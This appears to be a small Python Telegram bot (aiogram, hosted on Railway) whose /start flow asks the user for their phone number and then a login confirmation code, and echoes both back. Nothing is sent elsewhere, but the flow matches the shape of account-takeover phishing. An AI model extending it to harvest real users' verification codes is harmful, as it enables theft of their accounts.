import os
import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove

# Установите API_TOKEN в Railway (Variables)
API_TOKEN = os.getenv('API_TOKEN')

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

class AuthForm(StatesGroup):
    phone = State()
    code = State()

def get_phone_keyboard():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    keyboard.add(KeyboardButton("Отправить номер телефона", request_contact=True))
    return keyboard

@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    await message.answer("Для входа нажмите кнопку:", reply_markup=get_phone_keyboard())
    await AuthForm.phone.set()

@dp.message_handler(content_types=types.ContentType.CONTACT, state=AuthForm.phone)
async def get_phone(message: types.Message, state: FSMContext):
    await state.update_data(phone=message.contact.phone_number)
    await message.answer("Номер принят. Введите код подтверждения:", reply_markup=ReplyKeyboardRemove())
    await AuthForm.code.set()

@dp.message_handler(state=AuthForm.code)
async def get_code(message: types.Message, state: FSMContext):
    data = await state.get_data()
    phone = data['phone']
    code = message.text
    
    await message.answer(f"Данные получены.\nТелефон: {phone}\nКод: {code}")
    await state.finish()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
    
